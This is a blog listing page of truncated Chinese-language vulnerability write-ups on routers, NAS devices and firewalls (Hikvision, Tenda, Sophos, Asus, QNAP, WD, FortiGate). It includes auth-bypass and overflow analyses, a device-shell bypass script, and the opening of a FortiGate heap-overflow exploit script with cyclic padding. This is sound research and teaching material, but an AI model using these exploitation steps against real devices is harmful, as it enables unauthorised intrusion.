<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>vuln | CAI dog</title>
<meta name="keywords" content="">
<meta name="description" content="vuln - CAI dog">
<meta name="author" content="shangdi4sb">
<link rel="canonical" href="https://jellyfish-pro.github.io/posts/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/posts/index.xml">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="vuln" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://jellyfish-pro.github.io/posts/" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="vuln"/>
<meta name="twitter:description" content=""/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "vuln",
      "item": "https://jellyfish-pro.github.io/posts/"
    }
  ]
}
</script>
</head>

<body class="list" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
                    <span>search</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/" title="home">
                    <span>home</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/posts" title="posts">
                    <span class="active">posts</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/note" title="note">
                    <span>note</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
                    <span>ctf</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/study" title="study">
                    <span>study</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main"> 
<header class="page-header"><div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a></div>
  <h1>
    vuln
  </h1>
</header>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>[置顶] 注意事项
    </h2>
  </header>
  <div class="entry-content">
    <p>因为某些不可抗力，所以在您阅读以下文章时，会发现文章的结构有所缺失，请理解。 </p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to [置顶] 注意事项" href="https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞 漏洞简介 该漏洞存在于海康威视摄像头设备上，因为逻辑错误，导致没有判断用户名和密码。
环境搭建 这里使用的是海康威视的摄像头设备(DS-2CD1301D-I)，因为这个设备没有telnet和ssh命令，所以无法远程直接连上去。因此这里是连接的串口，串口是由师兄之前测试其他漏洞的时候焊上去的，故这里不介绍如何连接串口。
修改psh 连接串口后，也无法直接获取shell，因为海康威视自己写了一个shell名叫psh，如果直接启动设备的话，会直接取得psh，如下：
如果想要绕过这个psh，我们则需要修改内核参数，拿到普通shell。
首先我们ctrl&#43;U进入设置：
随后使用如下命令修改内核参数：
HKVS # printenv bootargs bootargs=console=ttyS0,115200 root=/dev/ram0 mem=42MHKVS # setenv bootargs console=ttyS0,115200 root=/dev/ram0 mem=42M singleHKVS # saveenv Saving Environment to SPI Flash...Erasing SPI flash...Writing to SPI flash...done 修改后使用reset命令重启：
需要注意的是，这里的内核还没有被加载，只是内核提供的一个手动启动内核的环境。因此我们在这里修改了psh后，再启动内核后，就可以获得正常的shell了。
#!/bin/bashrm /bin/pshtouch /bin/pshecho &#34;#!/bin/bash&#34; &gt; /bin/pshecho &#34;/bin/bash&#34; &gt;&gt; /bin/pshchmod &#43;x /bin/psh 随后执行linuxrc内核就可以获得普通的shell：
其实这个阶段如果不想手动修改psh的话，可以修改ip地址，使用挂载共享文件夹的方式，从共享文件夹中复制一个过来。
传递文件 虽然现在我们获得了正常的shell，但是设备上的busybox是被严重阉割过的，以至于连wget和curl命令都没有，也没有scp命令。没有这些命令，应该怎么传递文件呢？
我们可以使用nfs共享文件夹：
mount -t nfs 192.168.110.30:/tmp/nfs /run -o nolock 随后把要传输的文件复制到共享文件夹就好了。...</p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞" href="https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
通过检查一下busybox，目的是检查该固件需要的位数和架构：
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功
随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：...</p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现" href="https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-1040 sophos身份验证绕过漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。
该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。
环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。
随后使用VMware打开.ova文件就可以直接搭建好sophos环境。
不过这里需要注意一点就是网卡的配置：
sophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：
像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。
这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0
接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。
第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。
配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：
json数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。
sophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：
通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。
Apache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。
sophos中的perl是指向csc的：
而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。
这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。
漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。
我们可以使用一个简单例子：
对于处理同样的数据：
{ &#34;name\u0000ef&#34;: &#34;test&#34;, &#34;name&#34;:&#34;test2&#34; }
对于java来说：
import org.json.JSONObject;import org.json.JSONException;import java.io.*;class test {public static void main(String[] args) {try{System.out.println(new JSONObject(&#34;{ \&#34;name\&#34;: \&#34;test\&#34;, \&#34;name\\u0000ef\&#34;: \&#34;test2\&#34;}&#34;));}catch (JSONException e){System....</p>
  </div>
  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-1040 sophos身份验证绕过漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-26376 华硕固件内存崩溃漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2022-26376 华硕固件内存崩溃漏洞 漏洞简介 该漏洞存在于华硕固件和梅林固件中，不同型号对应的固件版本也不一致。如果想了解具体的型号，可以在NVD - CVE-2022-26376找到。
根据塔洛斯的说法：
A memory corruption vulnerability exists in the httpd unescape functionality of Asuswrt prior to 3.0.0.4.386_48706 and Asuswrt-Merlin New Gen prior to 386.7.. A specially-crafted HTTP request can lead to memory corruption. An attacker can send a network request to trigger this vulnerability.
这个漏洞会导致内存损坏。通过研究确实可以造成溢出，但并不能控制程序流。简言之就是，这个漏洞会造成内存损坏，但难以被利用。
漏洞分析 这里我使用的是梅林的386.5.2的源码
这里就是漏洞点，程序的大致流程为，判断字符串s中有没有百分号，如果有就利用sscanf函数对百分号和百分号后的两位进行解码，并将解码后的字符放在原百分号的位置，随后使用strlcpy和strncpy来覆盖百分号后两个字符。例如字符%41%42：
字符串中有百分号，使用sscanf函数对%41解码，并将解码出来的A放到原百分号的位置，字符变味了：A41%42 随后利用strlcpy将跳过**41将%42**放入s_tmp 最后，使用strncpy将%42接在A后面，原字符串就变为了：A%42 这就是一个解码url的循环。
乍一看，确实没问题，但是问题是如果我们将%41%42改了%41%a的话，就会出现问题：
第一轮解码，将会正常解析，字符串会变为：A%a
但当解析%a时就会出问题：
同样检测到百分号之后，使用sscanf函数对*%a进行解析，会解析为\n*，随后放到百分号的位置，字符串变为：A\na。 这时，strlcpy函数任然会读取原百分号（现在为\n）后两个字节放到s_tmp中。 这里我们可以看到，字符串中\n后只有一个字节（a）了。而strlcpy函数会读取\n后两个字节，这就说明会发生读取越界。
这里我们可以在设备上调试一下：
#!/usr/bin/python3import socketurl = b&#34;GET /Main_Login....</p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-26376 华硕固件内存崩溃漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-27596 威联通5.0.1sql注入漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。
固件版本为：
该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。
环境搭建 这里是直接使用的设备(qnap TS-853 pro)
该设备可以直接通过ssh和telnet连接上shell：
连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell
漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。
针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：
[CVE-2022-27596 | CataLpa’s Home (wzt.ac.cn)]
该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。
静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中
该函数删除了符号，但可以通过搜索字符串找到。
v9 = s···if ( *(_QWORD *)(a8 &#43; 24) ){v13 = *(const char **)(a8 &#43; 24);v14 = strlen(s);a2 = &#34;AND token = &#39;%s&#39; &#34;;sprintf(&amp;s[v14], &#34;AND token = &#39;%s&#39; &#34;, v13);}···v49 = sqlite3_mprintf(&amp;byte_7FFFF76DFA7F, a2, v9);···v48 = sqlite3_mprintf(&#34;SELECT * FROM QTOKEN %s %s %s;&#34;, v49, v51, v50);···sqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到&#34;AND token = &#39;%s&#39; &#34;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制...</p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-27596 威联通5.0.1sql注入漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。
环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。
因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。
当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录
执行下面的命令将pure-ftpd修改为西数的版本：
tar xf pure-ftpd_1.0.47.orig.tar.gzcd pure-ftpd-1.0.47.origfor patch_name in `ls ../patch`; do echo &#34;--&gt;patch name=$patch_name&#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。
解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。
根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。
但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：
这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。
bin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。
刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：
这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录
而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：
可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。
将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init
**注意：**这里的路径是已经被挂载后的路径。
这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。
启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。
虽然环境不能启动，但是我们可以直接启动ftp服务呀。
我们可以直接启动ftp服务：
漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。
而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：
这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048&#43;98个字节。
那么为什么要覆盖着loggedin呢？
其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：
动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：
但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。
故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent
其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。...</p>
  </div>
  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析 漏洞简介 该漏洞存在于Fortigate中的SSLVPN服务上，由于对Content-Length值的错误处理，并且没有控制数据包的长度，导致了堆溢出。
漏洞范围 5.0.0 &lt;= FortiOS &lt;= 5.0.145.2.0 &lt;= FortiOS &lt;= 5.2.155.4.0 &lt;= FortiOS &lt;= 5.4.135.6.0 &lt;= FortiOS &lt;= 5.6.146.0.0 &lt;= FortiOS &lt;= 6.0.156.2.0 &lt;= FortiOS &lt;= 6.2.116.4.0 &lt;= FortiOS &lt;= 6.4.107.0.0 &lt;= FortiOS &lt;= 7.0.87.2.0 &lt;= FortiOS &lt;= 7.2.21.0.0 &lt;= Fortiproxy &lt;= 1.0.71.1.0 &lt;= Fortiproxy &lt;= 1.1.61.2.0 &lt;= Fortiproxy &lt;= 1.2.132.0.0 &lt;= Fortiproxy &lt;= 2....</p>
  </div>
  <footer class="entry-footer">3 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用" href="https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式
    </h2>
  </header>
  <div class="entry-content">
    <p>飞塔堆溢出漏洞利用方式 查看偏移 我们使用以下的脚本，发送包，查看偏移：
import socketimport sslfrom pwn import *import pwnpath = &#34;/remote/login&#34;.encode()ip = &#34;192.168.113.66&#34;port = 10443padding = b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmh